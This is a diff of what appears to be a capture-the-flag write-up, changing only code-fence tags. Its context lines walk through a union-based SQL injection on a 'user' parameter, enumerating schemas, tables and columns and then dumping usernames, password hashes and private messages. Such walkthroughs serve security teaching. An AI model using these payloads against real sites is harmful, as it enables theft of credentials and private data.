@@ -138,7 +138,7 @@ We can now try a *Union-Based SQLi* by using the `UNION` clause to extract the i
 
 1. First, our goal is to get rid of the error message.
 
-```SQL
+```sql
 admin?user=1 UNION SELECT 1;--
 ```
 
@@ -146,7 +146,7 @@ admin?user=1 UNION SELECT 1;--
 
 The error message informs us that our `SELECT` statement have a different number of columns. After trying `1,2` and `1,2,3`, we get something that works:
 
-```SQL
+```sql
 admin?user=1 UNION SELECT 1,2,3,4;--
 ```
 
@@ -154,7 +154,7 @@ admin?user=1 UNION SELECT 1,2,3,4;--
 
 2. Let's try now to enumerate the databases of this site:
 
-```SQL
+```sql
 admin?user=1 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
 ```
 
@@ -164,7 +164,7 @@ The result is displaying the first part of our query: `user=1`, but not the info
 
 To bypass this issue, we need the first query to produce no results. Since we know that the first user's ID is `1`, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have no results to show us back, so it will continue with the rest of our query.
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
 ```
 
@@ -172,7 +172,7 @@ admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schem
 
 3. So we have found that there is a database called `marketplace`. Let's find out what tables it contains:
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables where table_schema='marketplace'--
 ```
 
@@ -180,7 +180,7 @@ admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema
 
 4. There are 3 tables: `items`, `messages`, and `users`. The latter seems the most useful, as it could contain sensitive data, such as passwords, so let's find out its columns:
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name='users'--
 ```
 
@@ -190,7 +190,7 @@ Bingo 🎉 ! We can see that the `users` table contains a `password` field, amon
 
 5. Now we know the column names. we can see all the data of the `users` table:
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', isAdministrator, '\n'),2,3,4 FROM marketplace.users; --
 ```
 
@@ -198,7 +198,7 @@ admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', is
 
 6. We see that the passwords are encrypted?. Let's also check the `messages` table we found earlier, starting with its columns:
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages';--
 ```
 
@@ -206,7 +206,7 @@ admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schem
 
 7. Now, let's see its full data:
 
-```SQL
+```sql
 admin?user=0 UNION SELECT group_concat(id, ':', message_content, ':', user_from, ':', user_to, ':', is_read, '\n'),2,3,4 FROM marketplace.messages;--
 ```
 
